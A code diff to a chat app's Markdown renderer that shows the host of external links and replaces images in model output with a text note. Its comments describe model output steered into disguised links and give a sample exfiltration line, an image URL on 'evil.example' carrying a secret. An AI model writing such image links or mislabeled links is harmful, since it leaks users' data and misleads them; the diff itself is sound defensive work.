@@ -8,6 +8,7 @@ import { prefersReducedMotion } from "@/components/canvas/canvas-view";
 import { CodeBlock } from "@/components/chat/CodeBlock";
 import type { Citation } from "@/lib/api";
 import { citeMarker, withCitationLinks } from "@/lib/markdown-citations";
+import { externalHost, imageNote, textShowsAddress } from "@/lib/safe-links";
 import { cn } from "@/lib/utils";
 
 type CitationStateValue = {
@@ -42,19 +43,29 @@ function hastText(node: HastNode | undefined): string {
 }
 
 const COMPONENTS: Components = {
-  a: function CitationLink({ href, children }) {
+  a: function CitationLink({ node, href, children }) {
     const { activeMarker, onFocus } = useContext(CitationState);
     const marker = citeMarker(href);
     if (marker === null) {
+      // A link to another site says where it goes before anyone clicks
+      // (lib/safe-links.ts): text the model was steered into writing can
+      // label a link to anywhere "Refund policy". No origin is passed, so
+      // the server render and the browser agree.
+      const host = externalHost(href);
+      const showHost = host !== null && !textShowsAddress(hastText(node as HastNode), href ?? "");
       return (
-        <a
-          href={href}
-          target="_blank"
-          rel="noopener noreferrer"
-          className="text-foreground focus-visible:ring-ring rounded-sm underline decoration-1 underline-offset-[3px] hover:decoration-2 focus-visible:ring-2 focus-visible:outline-none"
-        >
-          {children}
-        </a>
+        <>
+          <a
+            href={href}
+            target="_blank"
+            rel="noopener noreferrer"
+            title={host ? href : undefined}
+            className="text-foreground focus-visible:ring-ring rounded-sm underline decoration-1 underline-offset-[3px] hover:decoration-2 focus-visible:ring-2 focus-visible:outline-none"
+          >
+            {children}
+          </a>
+          {showHost ? <span className="text-muted-foreground text-small"> ({host})</span> : null}
+        </>
       );
     }
     return (
@@ -147,6 +158,14 @@ const COMPONENTS: Components = {
     <td className="border-border border-b py-1.5 pr-4 align-top">{children}</td>
   ),
   hr: () => <hr className="border-border my-5" />,
+  // Never loaded: an image in model output is fetched the moment it renders,
+  // with no click, so `![](https://evil.example/?d=<secret>)` would send data
+  // out (Phase 7a.2, lib/safe-links.ts). A note says what was left out.
+  img: ({ alt, src }) => (
+    <span className="border-border text-muted-foreground text-small inline-block rounded-sm border px-1.5 py-0.5">
+      {imageNote(alt, typeof src === "string" ? src : undefined)}
+    </span>
+  ),
 };
 
 /** Rendered Markdown for answers and retrieved passages.
